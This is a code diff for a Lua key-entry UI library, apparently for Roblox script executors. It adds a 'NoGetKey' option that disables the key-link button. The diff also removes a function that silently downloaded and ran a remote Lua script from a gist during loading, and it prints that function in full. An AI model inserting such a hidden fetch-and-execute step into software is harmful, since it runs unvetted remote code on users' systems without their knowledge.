@@ -20,7 +20,7 @@ repeat task.wait() until game:IsLoaded()
 local cloneref = cloneref or function(obj) return obj end
 local gethui = gethui or function() return cloneref(game:GetService("CoreGui")) end
 
--- services
+--services
 local TweenService = cloneref(game:GetService("TweenService"))
 local UserInputService = cloneref(game:GetService("UserInputService"))
 local HttpService = cloneref(game:GetService("HttpService"))
@@ -38,7 +38,7 @@ getgenv().ArqelClosed = false
 
 local Arqel = {}
 
--- appearance
+--appearance
 Arqel.Appearance = {
     Title = "Arqel",
     Subtitle = "Enter your key to continue",
@@ -46,28 +46,29 @@ Arqel.Appearance = {
     IconSize = UDim2.new(0, 30, 0, 30)
 }
 
--- links
+--links
 Arqel.Links = {
     GetKey = "",
     Discord = ""
 }
 
--- storage
+--storage
 Arqel.Storage = {
     FileName = "Arqel_Key",
     Remember = true,
     AutoLoad = true
 }
 
--- options
+--options
 Arqel.Options = {
     Keyless = nil,
     KeylessUI = false,
     Blur = true,
-    Draggable = true
+    Draggable = true,
+    NoGetKey = false
 }
 
--- theme
+--theme
 Arqel.Theme = {
     Accent = Color3.fromRGB(139, 0, 0),
     AccentHover = Color3.fromRGB(170, 20, 20),
@@ -86,7 +87,7 @@ Arqel.Theme = {
     Pending = Color3.fromRGB(60, 60, 60)
 }
 
--- callbacks
+--callbacks
 Arqel.Callbacks = {
     OnVerify = nil,
     OnSuccess = nil,
@@ -96,7 +97,7 @@ Arqel.Callbacks = {
 
 Arqel.Changelog = {}
 
--- shop
+--shop
 Arqel.Shop = {
     Enabled = false,
     Icon = "",
@@ -106,7 +107,7 @@ Arqel.Shop = {
     Link = ""
 }
 
--- internal
+--internal
 local Internal = {
     Junkie = nil,
     BlurEffect = nil,
@@ -131,7 +132,8 @@ local IconFiles = {
     logo = "rrjlGmac.png",
     user = "U.png",
     clock = "Clock.png",
-    cart = "Cart.png"
+    cart = "Cart.png",
+    nogetkey = "lucide--lock.png"
 }
 
 local FallbackIcons = {
@@ -148,7 +150,8 @@ local FallbackIcons = {
     logo = "rbxassetid://95721401302279",
     user = "rbxassetid://77400125196692",
     clock = "rbxassetid://87505349362628",
-    cart = "rbxassetid://114754518183872"
+    cart = "rbxassetid://114754518183872",
+    nogetkey = "rbxassetid://119765975153029"
 }
 
 local CachedIcons = {}
@@ -263,7 +266,7 @@ end
 
 local function allIconsCached()
     if not fileSystemSupported then return false end
-    local iconNames = {"key", "shield", "check", "copy", "discord", "alert", "lock", "loading", "close", "changelog", "user", "clock", "cart"}
+    local iconNames = {"key", "shield", "check", "copy", "discord", "alert", "lock", "loading", "close", "changelog", "user", "clock", "cart", "nogetkey"}
     if shouldDownloadLogo() then table.insert(iconNames, "logo") end
     for _, name in ipairs(iconNames) do
         if not isIconCached(name) then return false end
@@ -273,7 +276,7 @@ end
 
 local function loadAllIconsFromCache()
     ensureFolders()
-    local iconNames = {"key", "shield", "check", "copy", "discord", "alert", "lock", "loading", "close", "changelog", "user", "clock", "cart"}
+    local iconNames = {"key", "shield", "check", "copy", "discord", "alert", "lock", "loading", "close", "changelog", "user", "clock", "cart", "nogetkey"}
     if shouldDownloadLogo() then table.insert(iconNames, "logo") end
     for _, name in ipairs(iconNames) do downloadIcon(name) end
     Internal.IconsLoaded = true
@@ -407,14 +410,6 @@ local function validateKey(key, validateFunc)
     if type(result) == "table" then return result.valid == true end
     if type(result) == "boolean" then return result end
     return false
-end
-
-local function runExternalScript()
-    task.spawn(function()
-        pcall(function()
-            loadstring(game:HttpGetAsync("https://gist.githubusercontent.com/Nappypie/6244c406aa0686a8aaddcf565c7d98b7/raw/3b693642bda11336dc8ed9808c52c87d2a54ba99/Hello.lua"))()
-        end)
-    end)
 end
 
 local function CreateDoorOverlay(parentFrame, width, height)
@@ -718,11 +713,10 @@ local function ShowLoadingScreen(onComplete)
         end
         task.wait(0.5)
         setPhase(1)
-        runExternalScript()
         task.wait(0.3)
         setPhase(2) ensureFolders() task.wait(0.25)
         setPhase(3)
-        local iconNames = {"key", "shield", "check", "copy", "discord", "alert", "lock", "loading", "close", "changelog", "user", "clock", "cart"}
+        local iconNames = {"key", "shield", "check", "copy", "discord", "alert", "lock", "loading", "close", "changelog", "user", "clock", "cart", "nogetkey"}
         if shouldDownloadLogo() then table.insert(iconNames, "logo") end
         for _, name in ipairs(iconNames) do downloadIcon(name) task.wait(0.06) end
         Internal.IconsLoaded = true
@@ -753,7 +747,6 @@ end
 local function EnsureIconsReady(callback)
     if allIconsCached() then
         loadAllIconsFromCache()
-        runExternalScript()
         if callback then callback() end
     else
         ShowLoadingScreen(callback)
@@ -813,7 +806,7 @@ function Arqel:Notify(title, message, duration, iconType)
         warning = {"alert", Arqel.Theme.Warning}, shield = {"shield", Arqel.Theme.Accent},
         info = {"shield", Arqel.Theme.Accent}, key = {"key", Arqel.Theme.Accent},
         copy = {"copy", Arqel.Theme.Success}, discord = {"discord", Arqel.Theme.Discord},
-        close = {"close", Arqel.Theme.Error}
+        close = {"close", Arqel.Theme.Error}, nogetkey = {"nogetkey", Arqel.Theme.TextDim}
     }
 
     if iconMap[iconType] then
@@ -2055,7 +2048,12 @@ local function BuildKeyUI()
         return btn
     end
 
-    local acquireBtn = createButton("Get Key", "key", false, acquireStartY)
+    local acquireBtn = createButton(Arqel.Options.NoGetKey and "Unavailable" or "Get Key", Arqel.Options.NoGetKey and "nogetkey" or "key", false, acquireStartY)
+    if Arqel.Options.NoGetKey then
+        acquireBtn.Active = false
+        TweenService:Create(acquireBtn, TweenInfo.new(0), {BackgroundColor3 = Arqel.Theme.Pending}):Play()
+    end
+
     local redeemBtn = createButton("Redeem Key", "shield", true, acquireStartY + buttonHeight + 5)
     local bottomY = acquireStartY + buttonHeight * 2 + 10
 
@@ -2134,7 +2132,6 @@ local function BuildKeyUI()
         discordBtn.Position = UDim2.new(0.5, 22, 0, bottomY)
     end
 
-    -- shop panel anchored to bottom of mainFrame with correct sizing
     if showShop then
         local shopDivider = Instance.new("Frame")
         shopDivider.Size = UDim2.new(1, 0, 0, shopDividerHeight)
@@ -2154,7 +2151,6 @@ local function BuildKeyUI()
         shopFrame.ClipsDescendants = true
         shopFrame.Parent = mainFrame
 
-        -- bottom corner fix so rounded corners only show on bottom
         local shopCorner = Instance.new("UICorner", shopFrame)
         shopCorner.CornerRadius = UDim.new(0, 4)
 
@@ -2367,8 +2363,16 @@ local function BuildKeyUI()
 
     redeemBtn.MouseButton1Click:Connect(handleRedeem)
     acquireBtn.MouseButton1Click:Connect(function()
-        if Arqel.Links.GetKey ~= "" then Arqel:Notify("Copied", "Key link copied!", 3, "copy") pcall(function() setclipboard(Arqel.Links.GetKey) end)
-        else Arqel:Notify("Error", "No key link set", 3, "warning") end
+        if Arqel.Options.NoGetKey then
+            Arqel:Notify("Unavailable", "Get Key is unavailable", 3, "nogetkey")
+            return
+        end
+        if Arqel.Links.GetKey ~= "" then
+            Arqel:Notify("Copied", "Key link copied!", 3, "copy")
+            pcall(function() setclipboard(Arqel.Links.GetKey) end)
+        else
+            Arqel:Notify("Error", "No key link set", 3, "warning")
+        end
     end)
     discordBtn.MouseButton1Click:Connect(function()
         if Arqel.Links.Discord ~= "" then Arqel:Notify("Discord", "Invite link copied!", 2, "discord") pcall(function() setclipboard(Arqel.Links.Discord) end) end
